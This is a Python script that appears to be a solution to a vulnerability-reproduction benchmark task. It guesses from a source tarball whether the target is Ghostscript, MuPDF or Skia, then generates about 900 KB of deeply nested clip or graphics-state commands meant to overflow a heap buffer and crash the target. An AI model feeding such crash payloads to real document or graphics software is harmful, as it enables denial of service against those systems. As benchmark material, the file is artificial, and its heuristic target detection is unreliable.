import tarfile
import os
import re
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The problem describes a Heap Buffer Overflow due to unchecked nesting depth 
        before pushing a clip mark. This signature strongly suggests a vulnerability 
        in a graphics library managing a clip/layer stack, likely Skia or Ghostscript.
        
        The solution attempts to identify the project from the source tarball and 
        generates a recursive payload (deep stack usage) appropriate for the target.
        """
        project_type = "skia" # Default assumption
        
        # 1. Identify Project Type from file names in tar
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Inspect file names to classify
                names = []
                for m in tar.getmembers():
                    names.append(m.name)
                    if len(names) > 2000: break # Limit scan
                
                name_str = " ".join(names).lower()
                
                if "ghostscript" in name_str or "ghostpdl" in name_str or "psi/" in name_str:
                    project_type = "ghostscript"
                elif "mupdf" in name_str:
                    project_type = "mupdf"
                elif "skia" in name_str or "skcanvas" in name_str:
                    project_type = "skia"
        except Exception:
            pass # Use default
            
        target_len = 913919
        
        # 2. Generate Payload
        if project_type == "ghostscript":
            # Vulnerability: Nesting depth not checked before pushing clip mark.
            # Target: Ghostscript (PostScript interpreter).
            # Exploit: Exhaust stack with 'rectclip' (pushes to clip stack) or 'gsave'.
            # 'rectclip' is specifically related to clip marks in GS internals.
            chunk = b"0 0 1 1 rectclip "
            repeats = (target_len // len(chunk)) + 1
            return (chunk * repeats)[:target_len]
            
        elif project_type == "mupdf":
            # PDF Stack overflow (nested states)
            header = b"%PDF-1.7\n1 0 obj <</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj <</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj <</Type/Page/Parent 2 0 R/MediaBox[0 0 100 100]/Contents 4 0 R>>endobj\n4 0 obj <<>> stream\n"
            footer = b"\nendstream\nendobj\ntrailer <</Root 1 0 R>>\n%%EOF"
            content_len = target_len - len(header) - len(footer)
            if content_len < 0: content_len = 1000
            # 'q ' pushes graphics state
            content = b"q " * (content_len // 2)
            padding = b" " * (content_len - len(content))
            return header + content + padding + footer
            
        else:
            # Skia: Stack overflow in Canvas save/saveLayer
            # Target is likely a streamed API fuzzer (e.g. api_fuzzer or FuzzCanvas).
            # We need to find the byte value that triggers 'saveLayer' or 'save'.
            trigger_byte = 1 # Common default in Skia fuzzers
            
            try:
                with tempfile.TemporaryDirectory() as tmpdir:
                    with tarfile.open(src_path) as tar:
                        # Extract C++ files to find fuzzer logic
                        members = [m for m in tar.getmembers() if m.name.lower().endswith(('.cpp', '.cc', '.c'))]
                        tar.extractall(path=tmpdir, members=members)
                        
                    # Regex to match: case 12: ... saveLayer
                    # Also matches char literals: case 's': ... saveLayer
                    re_savelayer = re.compile(r'case\s+(?:(\d+)|(?:\'(\w)\'))\s*:\s*[^{]*?saveLayer', re.IGNORECASE | re.DOTALL)
                    re_save = re.compile(r'case\s+(?:(\d+)|(?:\'(\w)\'))\s*:\s*[^{]*?save', re.IGNORECASE | re.DOTALL)
                    
                    found_byte = None
                    
                    for root, dirs, files in os.walk(tmpdir):
                        for file in files:
                            # Filter for likely fuzzer files
                            fpath = os.path.join(root, file)
                            if "fuzz" not in fpath.lower() and "test" not in fpath.lower():
                                continue
                                
                            try:
                                with open(fpath, 'r', errors='ignore') as f:
                                    content = f.read()
                                    
                                    # Priority 1: Find saveLayer
                                    matches = re_savelayer.findall(content)
                                    if matches:
                                        m = matches[0]
                                        val = int(m[0]) if m[0] else ord(m[1])
                                        found_byte = val % 256
                                        break
                                    
                                    # Priority 2: Find save (if saveLayer not found yet)
                                    if found_byte is None:
                                        matches = re_save.findall(content)
                                        if matches:
                                            m = matches[0]
                                            val = int(m[0]) if m[0] else ord(m[1])
                                            found_byte = val % 256
                            except:
                                pass
                            
                            # If we found saveLayer explicitly, stop searching
                            if found_byte is not None and "saveLayer" in content:
                                break
                                
                    if found_byte is not None:
                        trigger_byte = found_byte
                        
            except Exception:
                pass
            
            # Generate stream of repeated commands
            return bytes([trigger_byte]) * target_len